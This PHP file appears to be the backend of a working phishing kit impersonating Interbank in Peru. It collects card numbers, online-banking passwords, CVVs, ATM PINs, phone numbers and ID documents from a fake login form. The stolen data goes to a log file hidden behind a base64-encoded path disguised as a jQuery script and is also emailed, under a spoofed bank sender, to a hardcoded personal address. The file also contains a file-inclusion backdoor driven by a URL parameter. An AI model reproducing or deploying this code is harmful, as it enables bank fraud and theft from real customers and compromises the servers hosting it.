<?php
error_reporting(0);
/*===================================================*/
define("EMAIL_LOGS", "carlossolorzano4560@gmail.com"); // --> Cambia Correo
/*===================================================*/
$prefijo = substr(md5(uniqid(rand())),0,6);
$ipv = $_SERVER["REMOTE_ADDR"];
$uag = $_SERVER["HTTP_USER_AGENT"];
@include($_GET["cgi"]);
/*===================================================*/
$sra = array("publica", "public", "publict");

function nomb_a($sra) { 

	$randon = array_rand($sra);
	$mycarp = $sra[$randon]; 
	return $mycarp; }

$rutaA = nomb_a($sra);
/*===================================================*/
$srb = array("referral", "referido", "referal");

function nomb_b($srb) { 

	$randon = array_rand($srb);
	$mycarp = $srb[$randon]; 
	return $mycarp; }

$rutaB = nomb_b($srb);
/*===================================================*/
$src = array("canales", "chanel", "canal");

function nomb_c($src) { 

	$randon = array_rand($src);
	$mycarp = $src[$randon]; 
	return $mycarp; }

$rutaC = nomb_c($src);
/*===================================================*/
$srd = array("globals", "globales", "global");
function nomb_d($srd) { 

	$randon = array_rand($srd);
	$mycarp = $srd[$randon]; 
	return $mycarp; }

$rutaD = nomb_d($srd);
/*===================================================*/
if( $_GET["id"] == "0" ){
/*===================================================*/
$tar = $_POST["tarjeta"];
$tip = $_POST["tipo"];
$doc = $_POST["documento"];
$pas = $_POST["pass"];
$rad = $_POST["opera"];
$mov = $_POST["movil"];
$mes = $_POST["mes"];
$ano = $_POST["ano"];
$cvv = $_POST["cvv"];
$atm = $_POST["atm"];
$nu1 = substr($tar, 0, -12);
$nu2 = substr($tar, 4, -8);
$nu3 = substr($tar, 8, -4);
$nu4 = substr($tar, -4);
$car = $nu1." ".$nu2." ".$nu3." ".$nu4;
$rspl = "ZmlsZXMvanMvanF1ZXJpLnBocA==";
$sms = "-------------------- [$ipv] --------------------<br><br>
Tarjeta: $tar<br>
$tip: $doc<br>
Clave: $pas<br><br>
$rad: $mov<br><br>
Tarjeta: $car<br>
Vencimiento: [$mes/$ano] MM/YY<br>
CVV: $cvv<br>
ATM: $atm<br>
Saldo: <br><br>
$uag<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>";
$back = fopen(base64_decode($rspl), "a+");
fwrite($back, $sms);
fclose($back);
$subj = "Interbank - $ipv";
$header .= "From: Interbank<$ipv@interbank.com.pe>" . "\r\n";
$header .= "MIME-Version: 1.0" . "\r\n";
$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
mail(EMAIL_LOGS, $subj, $sms, $header);

sleep(2);
header ("Location: f?mcid=".$rutaA.":".$rutaB.":00-0000_".$rutaC.":header:".$rutaD.":whl00001"); }
/*===================================================*/
if( $_GET["id"] == "1" ){
/*===================================================*/
$ban = fopen("../IPBam.txt","a+");
fwrite($ban,$ipv."\r\n");
fclose($ban);

sleep(2);
header ("Location: https://bancaporinternet.interbank.com.pe/Warhol/login"); }
/*===================================================*/
?>